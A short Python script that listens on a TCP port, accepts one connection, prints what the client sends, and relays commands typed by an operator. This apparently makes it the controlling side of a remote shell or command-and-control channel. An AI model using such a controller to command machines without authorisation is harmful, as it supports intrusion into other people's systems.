from socket import *


ip = "192.168.27.26" #"127.0.0.1"
port = 3924

connection = socket(AF_INET,SOCK_STREAM)
connection.bind((ip,port))

connection.listen(1)
client, addr = connection.accept()

print("Connect -> "+str(addr))

while True:
    reciever = client.recv(1024).decode()
    print(reciever)
    cmd = input("Command >> ")
    
    if cmd == "exit":
        client.send(cmd.encode())
        connection.close()
        exit()

    elif cmd == "" or cmd == None:
        cmd = "error"
        client.send(cmd.encode())

    else:
        client.send(cmd.encode())
